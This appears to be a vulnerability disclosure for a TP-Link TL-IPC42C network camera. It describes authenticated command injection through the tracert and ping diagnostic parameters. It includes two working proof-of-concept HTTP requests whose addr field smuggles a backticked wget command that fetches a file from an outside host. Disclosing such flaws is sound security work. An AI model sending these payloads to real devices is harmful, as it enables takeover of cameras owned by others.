## TP-Link TL-IPC42C RCE

vendor name:TP-Link

model:TL-IPC42C

version: V4.0_20211227_1.0.16

firmware download:https://security.tp-link.com.cn/service/detail_download_9856.html

![image](https://github.com/user-attachments/assets/9885cb2e-1868-4b76-8ffb-562c6cdb8e42)


![image](https://github.com/user-attachments/assets/5d000752-4ef9-42b3-b919-3ac0185900ac)




TP-Link TL-IPC42C is a network camera produced by TP-Link. Due to the lack of malicious code verification on both the frontend and backend, command execution vulnerabilities occurred.

The hidden ConfSysSettingDiagnostic.htm page was found in the web directory of the firmware.
![image](https://github.com/user-attachments/assets/8b3c3ed5-e2fe-4ec0-9e1d-a16312e9acdf)


By capturing and modifying http packets, you can access this page.
![image](https://github.com/user-attachments/assets/1262f306-5c7a-4774-b052-9ebbcf8d2fcf)


#### vulnerability 1    tracert

The vulnerability requires login credentials `stok`

vulnerability 1 appears in the sub_2D85A function of the dsd binary file

![image](https://github.com/user-attachments/assets/2650aacf-010d-499b-b082-a4c22e3ae6c6)


jso_obj_get_string_origin takes the addr from the tracert variable transferred by http service(httpd passes the request parameters to dsd ),concatenates it into the variable s with snprintf, and finally the system executes the s string.

##### **POC**

![image](https://github.com/user-attachments/assets/1f39b15e-cbc8-48b0-b9e1-e9c69980ce1b)


![image](https://github.com/user-attachments/assets/58fc4053-21f4-4947-a182-ab1bcfae2edd)

```
POST /stok=$your_stok_value_here/ds HTTP/1.1

Host: 192.168.2.229

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: application/json, text/javascript, */*; q=0.01

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/json; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 130

Origin: http://192.168.2.229

Connection: close

Referer: http://192.168.2.229/



{"diagnose":{"start":{"diag_type":"tracert","addr":"www.baidu.com`wget http://192.168.2.208:8000/aa`","hops":"20"}},"method":"do"}
```





#### vulnerability 2    ping

The vulnerability requires login credentials `stok`

Vulnerability 2 appears in the sub_2D85A function of the dsd binary file

![image](https://github.com/user-attachments/assets/16378359-1965-4d06-b4c5-6abe23148969)


jso_obj_get_string_origin takes the addr from the ping variable transferred by http service(httpd passes the request parameters to dsd)，v26 received the value of addr

taint propagation process: v26-- >v27---->s1---->s-- >sytstem

snprintf concatenates the variable s1 containing the malicious code into s, and the system executes the s string.

##### POC

![image](https://github.com/user-attachments/assets/c79eb22c-b7fc-4f14-9d5a-531c1a682bf1)

![image](https://github.com/user-attachments/assets/08610698-b05f-4537-8ba6-fbdce5de6bdd)




```
POST /stok=$your_stok_value_here/ds HTTP/1.1

Host: 192.168.2.229

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: application/json, text/javascript, */*; q=0.01

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/json; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 151

Origin: http://192.168.2.229

Connection: close

Referer: http://192.168.2.229/



{"diagnose":{"start":{"diag_type":"ping","addr":"www.baidu.com`wget http://192.168.2.208:8000/aa`","num":"4","size":"64","timeout":"1"}},"method":"do"}
```

